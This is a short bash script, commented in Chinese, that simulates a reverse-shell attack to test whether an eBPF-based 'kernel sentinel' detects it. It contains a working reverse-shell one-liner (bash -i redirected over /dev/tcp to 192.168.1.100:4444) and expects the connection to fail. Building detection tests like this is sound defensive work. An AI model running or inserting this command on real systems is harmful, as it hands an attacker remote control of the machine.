#!/bin/bash
# 反弹 Shell 模拟脚本
# 用于演示内核哨兵的检测能力
# 注意: 仅用于安全测试环境！

echo "[模拟] 反弹 Shell 攻击"
echo "  攻击机: 192.168.1.100:4444"
echo "  受害机: $(hostname)"

# 模拟反弹 Shell
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 2>/dev/null || {
    echo "  (连接失败 - 这是预期的，仅用于触发 eBPF 探针)"
}
